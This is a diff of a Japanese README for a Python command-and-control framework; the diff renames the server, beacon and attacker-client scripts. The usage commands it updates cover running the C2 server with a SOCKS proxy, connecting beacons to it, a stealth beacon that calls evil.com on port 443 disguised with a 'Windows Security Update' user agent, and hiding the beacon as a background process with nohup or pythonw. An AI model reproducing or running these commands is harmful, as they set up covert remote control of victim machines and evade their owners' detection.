@@ -83,10 +83,10 @@ python3 --version  # 3.7以上であることを確認
 ### 3. ファイル構成確認
 ```
 c2-framework/
-├── updated_c2_server.py    # C2サーバ
-├── attacker_client.py      # 攻撃者クライアント
-├── lightweight_beacon.py   # Beacon
-├── config_examples/        # 設定ファイル例
+├── server.py              # C2サーバ
+├── client.py              # 攻撃者クライアント
+├── beacon.py              # Beacon
+├── config_examples/       # 設定ファイル例
 │   ├── config.txt
 │   ├── stealth_config.txt
 │   └── dev_config.txt
@@ -100,19 +100,19 @@ c2-framework/
 #### 1. C2サーバ起動
 ```bash
 # ターミナル1: C2サーバ
-python3 updated_c2_server.py --host 0.0.0.0 --c2-port 4444 --socks-port 1080
+python3 server.py --host 0.0.0.0 --c2-port 4444 --socks-port 1080
 ```
 
 #### 2. Beacon接続（別マシンまたは別ターミナル）
 ```bash
 # ターミナル2: Beacon
-python3 lightweight_beacon.py -s 127.0.0.1 -p 4444 --beacon-id test_beacon
+python3 beacon.py -s 127.0.0.1 -p 4444 --beacon-id test_beacon
 ```
 
 #### 3. 攻撃者クライアント接続
 ```bash
 # ターミナル3: 攻撃者クライアント
-python3 attacker_client.py -s 127.0.0.1 -p 4444
+python3 client.py -s 127.0.0.1 -p 4444
 ```
 
 #### 4. 基本操作
@@ -130,36 +130,36 @@ C2[test_beacon]> ls           # ファイル一覧
 
 #### 基本起動
 ```bash
-python3 updated_c2_server.py
+python3 server.py
 ```
 
 #### カスタムポート
 ```bash
-python3 updated_c2_server.py --host 192.168.1.100 --c2-port 8080 --socks-port 8081
+python3 server.py --host 192.168.1.100 --c2-port 8080 --socks-port 8081
 ```
 
 #### 外部接続許可
 ```bash
-python3 updated_c2_server.py --host 0.0.0.0
+python3 server.py --host 0.0.0.0
 ```
 
 ### Beacon
 
 #### 基本接続
 ```bash
-python3 lightweight_beacon.py -s <C2サーバIP> -p 4444
+python3 beacon.py -s <C2サーバIP> -p 4444
 ```
 
 #### 高度な設定
 ```bash
 # カスタムBeacon ID、チェックイン間隔
-python3 lightweight_beacon.py -s 192.168.1.100 -p 4444 \
+python3 beacon.py -s 192.168.1.100 -p 4444 \
   --beacon-id corporate_pc_001 \
   --sleep 60 \
   --jitter 0.4
 
 # ステルスモード
-python3 lightweight_beacon.py -s evil.com -p 443 \
+python3 beacon.py -s evil.com -p 443 \
   --stealth \
   --user-agent "Windows Security Update"
 ```
@@ -178,23 +178,23 @@ user_agent=Microsoft Update Service
 EOF
 
 # 設定ファイルで実行
-python3 lightweight_beacon.py -c beacon_config.txt
+python3 beacon.py -c beacon_config.txt
 ```
 
 #### バックグラウンド実行
 ```bash
 # Linux/macOS
-nohup python3 lightweight_beacon.py -c config.txt > /dev/null 2>&1 &
+nohup python3 beacon.py -c config.txt > /dev/null 2>&1 &
 
 # Windows
-pythonw lightweight_beacon.py -c config.txt
+pythonw beacon.py -c config.txt
 ```
 
 ### 攻撃者クライアント
 
 #### 接続
 ```bash
-python3 attacker_client.py -s <C2サーバIP> -p 4444
+python3 client.py -s <C2サーバIP> -p 4444
 ```
 
 #### コマンド一覧
@@ -386,10 +386,10 @@ python3 --version
 ### ログ確認
 ```bash
 # サーバログ
-python3 updated_c2_server.py 2>&1 | tee c2_server.log
+python3 server.py 2>&1 | tee c2_server.log
 
 # Beaconデバッグ
-python3 lightweight_beacon.py -s <server> --config debug_config.txt
+python3 beacon.py -s <server> --config debug_config.txt
 ```
 
 ### パフォーマンス調整
